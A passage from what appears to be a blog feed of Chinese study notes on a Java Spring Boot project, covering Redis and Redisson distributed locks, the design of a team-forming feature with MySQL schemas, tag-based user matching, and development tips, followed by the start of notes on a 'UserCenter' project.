update</code>行级锁，保证同一时间段有一个线程对数据库进行查询和更改，这个期间其他线程无法插足.（最简单）也可以用乐观锁实现.<br><strong>Redis存标识</strong>：内存数据库，<strong>读写速度快</strong>.支持setnx、lua脚本，比较方便实现分布锁.<br>setnx：set if not exists 如果不存在，则设置；只有设置成功次啊会返ture，否则返回false.</p><p><img src="G:/blog/source/imgs/2025-01/image-20250129234041235.png" alt="image-20250129234041235"></p><p><strong>注意事项</strong></p><ol><li><p>用完锁要释放<code>del lock</code></p></li><li><p>锁一定要加过期时间<code>set lock uum ex 10 nx</code></p></li><li><p>如果方法执行过长，锁提前过期？</p><p>问题：</p><ol><li>连锁效应：释放掉别人的锁.（还是会存在多个方法同时执行的情况，执行完的时间&gt;加锁时间）比如A执行40s，加锁30s，B执行30s，加锁30s;A没执行完，数据库标识已经更改为B的了.b</li><li>还是会存在多个方法同时执行的情况？</li></ol><ul><li>解决连锁效应：在释放锁之前检查一下当前的锁是不是自己标识的，不是则忽略.</li><li>解决锁未执行完：续期<code>set lock uum ex 10 nx</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">end</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span> (() -&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!end) &#123;</span><br><span class="line">        续期</span><br><span class="line">    &#125;)</span><br><span class="line">end = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></li><li><p>释放锁的时候，有可能先判断出是自己的锁，结果锁刚好过期了，最后还是释放了别人的锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原子操作</span></span><br><span class="line"><span class="keyword">if</span>(get lock == A) &#123;</span><br><span class="line"><span class="comment">// set lock B 不允许</span></span><br><span class="line">     del lock</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Redis+lua脚本实现</p></li><li><p>Redis如果是集群（而不是只有一个Redis），如果分布式锁的数据不同步怎么办？</p></li></ol><p>Zookeeper实现</p><h5 id="Redisson实现分布式锁"><a href="#Redisson实现分布式锁" class="headerlink" title="Redisson实现分布式锁"></a>Redisson实现分布式锁</h5><p>Java客户端，数据网格，实现了很多Java里支持的接口和数据结构.<br>是一俄格Java操作Redis的客户端，<strong>提供了大量的分布式数据集来简化对Redis的操作和使用，可以让开发者像使用本地集合一样使用Redis，完全感知不到Redis的存在.</strong></p><h6 id="2种引入方式"><a href="#2种引入方式" class="headerlink" title="2种引入方式"></a>2种引入方式</h6><ol><li>spring boot  starter引入（不推荐）</li><li>直接引入：<a href="https://redisson.org/docs/getting-started/">Getting Started - <code>Redis</code>son Reference Guide</a></li></ol><p><strong>实例代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//list 数据存储在 JVM 中</span></span><br><span class="line">       List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       list.add(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line">       System.out.println(<span class="string">&quot;list:&quot;</span> + list.get(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">       list.remove(<span class="number">0</span>);</span><br><span class="line">       <span class="comment">//数据存储在 redis 内存中</span></span><br><span class="line">       RList&lt;String&gt; rList = redissonClient.getList(<span class="string">&quot;test-list&quot;</span>);</span><br><span class="line">       rList.add(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line">       System.out.println(<span class="string">&quot;rList:&quot;</span> + rList.get(<span class="number">0</span>));</span><br><span class="line">       rList.remove(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h5 id="定时任务-锁"><a href="#定时任务-锁" class="headerlink" title="定时任务+锁"></a>定时任务+锁</h5><ol><li>waitTime设置为0，只抢一次，抢不到就放弃</li><li>注意释放锁要写在finally中</li></ol><p><a href="https://segmentfault.com/a/1190000044662262">面试官：说一下红锁RedLock的实现原理？ - Java中文社群 - SegmentFault 思否</a></p><h5 id="看门狗机制"><a href="#看门狗机制" class="headerlink" title="看门狗机制"></a>看门狗机制</h5><blockquote><p>redisson中提供的续期机制</p></blockquote><p>开一个监听线程，如果方法还没执行完，就帮你重置redis锁的过期时间.<br><strong>原理</strong></p><ol><li>监听当前线程，默认过期时间是30s，每10s续期一次(补到30s)</li><li>如果线程挂掉（debug模式也会被当成服务器宕机），则不会续期</li><li><a href="https://blog.csdn.net/qq_26222859/article/details/79645203">Redisson 分布式锁的watch dog自动续期机制_redisson续期-CSDN博客</a></li></ol><h6 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">testWatchDog</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RLock</span> <span class="variable">lock</span> <span class="operator">=</span> redissonClient.getLock(<span class="string">&quot;yub:user:recommed:doCache:lock&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//只有一个线程能获取锁</span></span><br><span class="line">            <span class="keyword">if</span>(lock.tryLock(<span class="number">0</span>,-<span class="number">1</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">                <span class="comment">//TODO 实际要执行的方法</span></span><br><span class="line">                System.out.println(<span class="string">&quot;getLock:&quot;</span> + Thread.currentThread().getId());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            log.error(e.getMessage());</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//只能释放自己的锁</span></span><br><span class="line">            <span class="keyword">if</span>(lock.isHeldByCurrentThread()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;unLock:&quot;</span> + Thread.currentThread().getId());</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="组队功能"><a href="#组队功能" class="headerlink" title="组队功能"></a>组队功能</h4><h5 id="需求分析-1"><a href="#需求分析-1" class="headerlink" title="需求分析"></a><strong>需求分析</strong></h5><p>用户可以<strong>创建</strong>一个队伍，设置队伍的人数、队伍名称（标题）、描述、超时时间 P0</p><blockquote><p>队长、剩余的人数<br>聊天？<br>公开 or private or 加密<br>信息流中不展示已过期的队伍</p></blockquote><p>展示队伍列表，根据标签或名称搜索队伍 P0<br>修改队伍信息 P0~P1<br>用户创建队伍上限5个<br>用户可以加入队伍（其他人、未满、未过期），允许加入多个队伍，但是有上限 P0</p><blockquote><p>是否需要队长同意？筛选审批?转让队伍？</p></blockquote><p>用户可以退出队伍（转让队伍给第二时间来的成员）P1<br>队长可以解散队伍 P0<br>分享队伍，邀请队员 P1<br>队伍人满之后发送消息通知 P1</p><h5 id="系统（接口）设计"><a href="#系统（接口）设计" class="headerlink" title="系统（接口）设计"></a>系统（接口）设计</h5><h6 id="1-创建队伍"><a href="#1-创建队伍" class="headerlink" title="1.创建队伍"></a>1.创建队伍</h6><p>用户可以<strong>创建</strong>一个队伍，设置队伍的人数、队伍名称（标题）、描述、超时时间 P0</p><blockquote><p>队长、剩余的人数<br>聊天？<br>公开 or private or 加密<br>信息流中不展示已过期的队伍</p></blockquote><ol><li>请求参数是否为空？</li><li>是否登录，未登录不允许创建</li><li>校验信息<ol><li>队伍人数 &gt; 1 且 &lt;&#x3D; 20</li><li>队伍名称 &lt;&#x3D; 20</li><li>队伍描述 &lt;&#x3D; 512</li><li>status 是否公开（int）不传默认为0（公开）</li><li>status 为加密，必须有密码，密码 &lt;&#x3D; 32</li><li>超时时间 &gt; 当前时间</li><li>校验用户最多创建5个队伍</li></ol></li><li>插入队伍信息到队伍表</li><li>插入用户 &#x3D; &gt; 队伍关系用户表</li><li>关联查询已加入队伍的用户信息</li></ol><h6 id="2-查询队伍列表"><a href="#2-查询队伍列表" class="headerlink" title="2.查询队伍列表"></a>2.查询队伍列表</h6><p>展示队伍列表，根据名称、最大人数等搜索队伍，信息流中不展示已过期的队伍信息</p><ol><li>从请求参数中去除队伍名称，如果存在则作为查询条件</li><li>不展示已经过期的队伍（根据时间筛选）</li><li>可以通过某个关键词同时对名称和描述查询</li><li>只有管理员才能查看加密的房间</li><li>关联查询已加入的队伍的用户信息（可能会很耗费性能，建议自己写SQL实现）</li></ol><p><strong>实现方式</strong></p><ol><li><p>自己写SQL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1.</span> 自己写<span class="keyword">SQL</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 查询队伍和创建人的信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> team t <span class="keyword">left</span> <span class="keyword">join</span> <span class="keyword">user</span> u <span class="keyword">on</span> t.userId <span class="operator">=</span> u.id</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 查询队伍和已加入队伍成员的信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> team t <span class="keyword">join</span> user_team ut <span class="keyword">on</span> t.id <span class="operator">=</span> user_teamId </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> team t</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> user_team ut <span class="keyword">on</span> t.id <span class="operator">=</span> ut.teamId;</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> <span class="keyword">user</span> u om ut.userId <span class="operator">=</span> u.id;</span><br></pre></td></tr></table></figure></li></ol><h6 id="3-修改用户信息"><a href="#3-修改用户信息" class="headerlink" title="3. 修改用户信息"></a>3. 修改用户信息</h6><ol><li>判断请求参数是否为空</li><li>查询队伍是否存在</li><li>只有管理员或者用户创建者可以修改</li><li>如果用户传入的新值和老值一致，就不用update</li><li>如果队伍改成加密，必须要有密码</li><li>更新成功</li></ol><h6 id="4-用户可以加入队伍"><a href="#4-用户可以加入队伍" class="headerlink" title="4. 用户可以加入队伍"></a>4. 用户可以加入队伍</h6><p>其他人、未满、未过期，允许加入多个队伍，但是有上限 P0</p><ol><li>用户最多加入5个队伍</li><li>队伍必须存在，只能加入未满、未过期</li><li>不能重复加入已加入的队伍（幂等性）</li><li>禁止加入私有的队伍</li><li>如果加入队伍是加密的，密码必须匹配</li><li>新增队伍 - 用户关联信息</li></ol><blockquote><p>注意：并发可能出现问题，一定加上事务注解防止数据不一致</p></blockquote><h6 id="5-用户可以退出队伍"><a href="#5-用户可以退出队伍" class="headerlink" title="5. 用户可以退出队伍"></a>5. 用户可以退出队伍</h6><blockquote><p>如果队长退出，权限转移给第二早的用户</p></blockquote><p>请求参数：用户id</p><ol><li>校验参数</li><li>校验队伍是否存在</li><li>校验用户是否加入队伍</li><li>如果队伍<ol><li>只剩1人，队伍解散</li><li>还有其他人<ol><li>队长退出，权限转移给第二早的用户（取id最小的数据）</li><li>非队长直接退出</li></ol></li></ol></li></ol><h6 id="6-队长可以解散队伍"><a href="#6-队长可以解散队伍" class="headerlink" title="6. 队长可以解散队伍"></a>6. 队长可以解散队伍</h6><p>请求参数：队伍id<br>业务流程：</p><ol><li>校验请求参数</li><li>校验队伍是否存在</li><li>校验你是不是队长</li><li>移除所有加入队伍的关联信息</li><li>删除队伍</li></ol><h6 id="7-分享队伍"><a href="#7-分享队伍" class="headerlink" title="7. 分享队伍"></a>7. 分享队伍</h6><p>业务流程：</p><ol><li>生成分享链接&#x2F;二维码</li><li>用户访问链接，可以点击加入</li></ol><h5 id="数据库表设计-1"><a href="#数据库表设计-1" class="headerlink" title="数据库表设计"></a>数据库表设计</h5><p>队伍表 team<br>字段：</p><ul><li>id 主键 bigint（最简单、连续，放在url上比较简短，但缺点是怕爬虫）</li><li>name 队伍名称</li><li>description 描述</li><li>maxNum 最大人数</li><li>expireTime 超时时间</li><li>userId 创建人 id</li><li>status 0 - 公开，1 - 私有，2 - 加密</li><li>password 密码</li><li>creatTime 创建时间</li><li>updateTime 更新时间</li><li>isDelete 是否删除</li></ul><p>两个关系：</p><ol><li>用户加了那些队伍？</li><li>队伍有哪些用户？</li></ol><p>方式：</p><ol><li>建立用户-队伍关系表 teamld userld(便于修改，查询性能高一点，可以选择这个，不用全表遍历)</li><li>用户表补充已加入的队伍字段，队伍表补充已加入的用户字段(便于查询，不用写多对多的代码，可以直接根据队伍查用户、根据用户查队伍)</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> team</span><br><span class="line">(</span><br><span class="line">    id          <span class="type">bigint</span> auto_increment comment <span class="string">&#x27;id&#x27;</span></span><br><span class="line">        <span class="keyword">primary</span> key,</span><br><span class="line">    name        <span class="type">varchar</span>(<span class="number">256</span>)                       <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;队伍名称&#x27;</span>,</span><br><span class="line">    description <span class="type">varchar</span>(<span class="number">1024</span>)                      <span class="keyword">null</span> comment <span class="string">&#x27;描述&#x27;</span>,</span><br><span class="line">    maxNum      <span class="type">int</span>      <span class="keyword">default</span> <span class="number">1</span>                 <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;最大人数&#x27;</span>,</span><br><span class="line">    expireTime  datetime                           <span class="keyword">null</span> comment <span class="string">&#x27;过期时间&#x27;</span>,</span><br><span class="line">    userId      <span class="type">bigint</span> comment <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">    status      <span class="type">int</span>      <span class="keyword">default</span> <span class="number">0</span>                 <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;0 - 公开，1 - 私有，2 - 加密&#x27;</span>,</span><br><span class="line">    password    <span class="type">varchar</span>(<span class="number">512</span>)                       <span class="keyword">null</span> comment <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    createTime  datetime <span class="keyword">default</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    updateTime  datetime <span class="keyword">default</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">null</span> <span class="keyword">on</span> <span class="keyword">update</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">    isDelete    tinyint  <span class="keyword">default</span> <span class="number">0</span>                 <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;是否删除&#x27;</span></span><br><span class="line">)</span><br><span class="line">    comment <span class="string">&#x27;队伍&#x27;</span>;</span><br></pre></td></tr></table></figure><p>用户-队伍表 user_team表<br>字段：</p><ul><li>id 主键</li><li>userId 用户 id</li><li>teamId 队伍 id</li><li>joinTime 加入时间</li><li>creatTime 创建时间</li><li>updateTime 更新时间</li><li>isDelete 是否删除</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> user_team</span><br><span class="line">(</span><br><span class="line">    id         <span class="type">bigint</span> auto_increment comment <span class="string">&#x27;id&#x27;</span></span><br><span class="line">        <span class="keyword">primary</span> key,</span><br><span class="line">    userId     <span class="type">bigint</span> comment <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">    teamId     <span class="type">bigint</span> comment <span class="string">&#x27;队伍id&#x27;</span>,</span><br><span class="line">    joinTime   datetime                           <span class="keyword">null</span> comment <span class="string">&#x27;加入时间&#x27;</span>,</span><br><span class="line">    createTime datetime <span class="keyword">default</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    updateTime datetime <span class="keyword">default</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">null</span> <span class="keyword">on</span> <span class="keyword">update</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">    isDelete   tinyint  <span class="keyword">default</span> <span class="number">0</span>                 <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;是否删除&#x27;</span></span><br><span class="line">)</span><br><span class="line">    comment <span class="string">&#x27;用户队伍关系&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="为什么需要请求参数包装类？"><a href="#为什么需要请求参数包装类？" class="headerlink" title="为什么需要请求参数包装类？"></a>为什么需要请求参数包装类？</h5><ol><li>请求参数名称&#x2F;类型和实体类不一样</li><li>有一些参数用不到，如果要自动生成接口文档，会增加理解成本</li><li>对个体类映射到同一个对象</li></ol><h5 id="为什么需要包装类"><a href="#为什么需要包装类" class="headerlink" title="为什么需要包装类"></a>为什么需要包装类</h5><ol><li>可能有些字段需要隐藏，不能返回给前端</li><li>或者有些字段是不关心的</li></ol><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>库表设计<br>增删改查<br>业务逻辑开发（P0优先）</p><h5 id="随机匹配"><a href="#随机匹配" class="headerlink" title="随机匹配"></a>随机匹配</h5><blockquote><p>高效匹配志同道合的朋友</p></blockquote><h6 id="1-怎么匹配"><a href="#1-怎么匹配" class="headerlink" title="1. 怎么匹配"></a>1. 怎么匹配</h6><ul><li>匹配多个，按相似度从高到低匹配</li><li>根据标签匹配</li><li>根据user_team 匹配加入相同队伍的用户</li></ul><p>本质：找到相似标签的用户<br>举例：<br>用户A：[Java, 大一，女]<br>用户B：[Java, 大二，女]<br>用户C：[Python, 大二，女]</p><ol><li>找到有共同标签最多的用户（TopN）</li><li>共同标签越多，分数越高，越在前面</li><li>如果没有匹配用户，随机推荐几个（降级方案）</li></ol><p><strong>两种算法</strong><br>编辑距离算法: <a href="https://blog.csdn.net/DBC_121/article/details/104198838">详解编辑距离算法-Levenshtein Distance-CSDN博客</a></p><blockquote><p>最小编辑距离：字符串 1 通过最少多少次增删改字符的操作可以编程字符串2</p></blockquote><p>余弦相似度算法：<a href="https://blog.csdn.net/yang_shibiao/article/details/122676855">用户画像标签数据开发之标签相似度计算-CSDN博客</a></p><h6 id="2-怎么对所有用户进行匹配，取TOP"><a href="#2-怎么对所有用户进行匹配，取TOP" class="headerlink" title="2. 怎么对所有用户进行匹配，取TOP"></a>2. 怎么对所有用户进行匹配，取TOP</h6><p>直接取出所有用户，一次和当前用户计算分数，取TopN<br>优化：</p><ol><li>切记不要在数据量大的时候循环输出日志（取消日志20s）</li><li>Map存储所有分数信息，占用内存<br>解决：维护一个固定长度的有序集合（sortedSet），只保留分数最高的几个用户【TOP 5】，时间换空间</li><li>注意需要除去自己</li><li>尽量只查需要的用户<ol><li>过滤掉标签为空的用户</li><li>根据部分标签取用户（前提是能区分出来哪个标签比较重要）</li><li>只查需要的数据（比如id和tags 只用了7s）</li></ol></li><li>提前查？<ol><li>提前缓存所有用户（不适合标签频繁更新的数据）</li><li>提前运算出结果，缓存（针对重点用户，提前缓存）</li></ol></li></ol><p>大数据推荐流程：检索 &#x3D;&gt; 召回 &#x3D;&gt; 粗排 &#x3D;&gt; 精排  &#x3D;&gt; 重排序等等<br>检索：尽可能多地查符合要求得数据<br>召回：查询可能要用到的数据（不做运算）<br>粗排：粗略排序，简单地运算<br>精排：精细排序，确定固定排位</p><h5 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h5><p>使用Redis GEO实现距离编辑和搜索附近用户功能.</p><ol><li>数据库表增加字段<ul><li>新增经纬度字段 decimal</li><li>新增纬度字段 decimal</li><li>RedisZset实现，</li></ul></li><li>UserVO类增加字段<ul><li>添加distance字段（向前端返回用户间位置信息） double类型</li></ul></li><li>编写测试类<ul><li>使用Spring Data Redis提供的StringRedisTemplate（Key&#x2F;Value都是Stirng类型）</li></ul></li></ol><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h5><ol><li><p>controller校验是否为空，service层校验是否合法.</p></li><li><p>内外层均进行鉴权，对性能影响微乎其微.</p></li><li><p>数据类型为非包装类（如long Id），可以不用判空，默认为0.</p></li><li><p>在Application类中使用<code>@EnableScheduling</code>开启spring对定时任务的支持.</p></li><li><p>分页使用Page（MybatisPlus提供）current自动计算不需利用<code>(pageNum - 1) * pageSize</code><br><img src="G:/blog/source/imgs/2025-01/image-20250125185506972.png" alt="image-20250125185506972"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/recommend&quot;)</span></span><br><span class="line"><span class="keyword">public</span> BaseResponse&lt;Page&lt;User&gt;&gt; <span class="title function_">recommendUsers</span><span class="params">(<span class="type">long</span> pageSize, <span class="type">long</span> pageNum, HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">QueryWrapper</span> <span class="variable">queryWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    Page&lt;User&gt; userList = userService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(pageNum, pageSize), queryWrapper);</span><br><span class="line">    <span class="keyword">return</span> ResultsUtils.success(userList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>MybatisPlus提供批量插入，<code>saveBatch</code>方法实现.</p></li><li><p>SpringMVC负责post、get等等请求处理</p></li><li><p>引入一个库时，先写测试类</p></li><li><p>ctrl + alt + t可以抛异常包裹</p></li><li><p>写缓存，使用<code>@Slf4j</code>中的<code>log.error()</code>，即使失败也可以讲数据库查到的内容返回给前端 故不直接使用全局异常处理器（返回错误给用户）</p></li><li><p>分析有缺点时要从整个项目由0到1的链路上分析（比如设计、开发）</p></li><li><p>白名单内容不要写死，动态（比如给数据库中做标记）</p></li><li><p>synchronized只对当前的线程有效（只能控制单个JVM【服务器】）</p></li><li><p>设置分布式锁时统一使用setnnx（使用set会进行更改）</p></li><li><p>响应值有关安全性</p></li><li><p>包装类要使用<code>Optional.ofNullable().orElse()</code>设置默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">maxNum</span> <span class="operator">=</span> Optional.ofNullable(team.getMaxNum()).orElse(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li><li><p>开启事务在类上方引入（有增删改事务最好加上）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br></pre></td></tr></table></figure></li><li><p>开发者工具可以帮助我们获取时间，配合Knif4j测试</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;console.log(JSON.stringify(new <span class="built_in">Date</span>()))</span><br><span class="line"> &quot;<span class="number">2025</span>-<span class="number">01</span>-<span class="number">31</span>T05:<span class="number">47</span>:<span class="number">02</span>.<span class="number">462</span>Z&quot;</span><br></pre></td></tr></table></figure></li><li><p>dto：业务封装类；vo：返回给前端的封装类</p></li><li><p>关联多个表推荐自己写SQL</p></li><li><p>使用equals()时注意翻转，确保不为空对象在前，避免不必要的NPE</p></li><li><p>对数据库的操作，建议把用户传参</p></li><li><p>ctrl + alt + v 提取变量替换</p></li><li><p>复用listTeam方法，只新增查询条件，不做修改（开闭原则）</p></li><li><p>涉及查数据的地方限制页数，防止数据库泄露、</p></li><li><p>加锁<code>synchronized</code>加锁接收的是对象使用<code>String.valueOf(userId).intern()</code>锁住常量（同一个对象 <code>intern()</code>实现）</p></li><li><p><code>ErrorCode</code>枚举类中不使用final修饰<code>description</code>取代反射来动态设置<code>description</code></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;需求分析&quot;&gt;&lt;a href=&quot;#需求分析&quot; class=&quot;headerlink&quot; title=&quot;需求分析&quot;&gt;&lt;/a&gt;需求分析&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;用户自定义添加标签，标签的分类（类型，怎么分类）比如Java&amp;#x2F;C++&amp;#x2F;网络安全，工作&amp;#x2</summary>
      
    
    
    
    
    <category term="Project" scheme="https://yubut.github.io/tags/Project/"/>
    
  </entry>
  
  <entry>
    <title>UserCenter项目疑问记录</title>
    <link href="https://yubut.github.io/2025/01/20/UserCenter%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/"/>
    <id>https://yubut.github.io/2025/01/20/UserCenter%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/</id>
    <published>2025-01-20T14:46:20.000Z</published>
    <updated>2025-01-24T06:23:56.961Z</updated>
    
    <content type="html"><![CDATA[<h3 id="UserCenter-项目疑问记录"><a href="#UserCenter-项目疑问记录" class="headerlink" title="UserCenter 项目疑问记录"></a>UserCenter 项目疑问记录</h3><p>如何进行企业级开发?其实不管做什么都需要事先做好规划.项目要实现的功能是什么，要怎么实现，做一个具体规划（预估时间），先完成框架搭建再去细化.</p><h4 id="项目完整开发流程"><a href="#项目完整开发流程" class="headerlink" title="项目完整开发流程"></a>项目完整开发流程</h4><ul><li>需求分析</li><li>设计（概要设计、详细设计）</li><li>技术选型（前端&#x2F;后端）</li><li>初始化（前端&#x2F;后端），引入需要的技术</li><li>搭建框架（Demo）【引入框架后可依据需求瘦身】</li><li>实现业务逻辑</li><li>测试（单元测试）</li><li>代码提交&#x2F;代码评审</li><li>部署</li><li>发布</li></ul><p><strong>Tips</strong></p><ol><li>框架瘦身阶段，每次删除一个文件都要重启项目是否能运行.</li><li>多查看官方文档.</li><li>养成好习惯，数据库相关操作语句做好本地或云端备份.</li></ol><p><strong>需要掌握的基本知识</strong></p><p>controller：只需接收请求，不做任何业务处理.倾向对请求参数本身的校验，较少涉及业务逻辑校验.<br>service: 业务逻辑处理（校验）有可能被contoller之外的类调用<br>mapper（dao）：数据访问层<br>model：数据封装类<br>utils：工具类（比如加密，日期转换，日期转换）<br>Lombook：帮助生成小的Java类实体对象</p><h4 id="Spring-Boot框架整合"><a href="#Spring-Boot框架整合" class="headerlink" title="Spring Boot框架整合"></a>Spring Boot框架整合</h4><ol><li><p>创建数据库</p><p><img src="/../imgs/2025-01/image-20250119104243355.png" alt="image-20250119104243355"></p></li><li><p>建表<br><img src="/../imgs/2025-01/image-20250119104354791.png" alt="image-20250119104354791"></p></li><li><p>引入需要的依赖，比如Junit4（Maven Repository）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!-- JUnit --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>4.配置yml文件.</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span 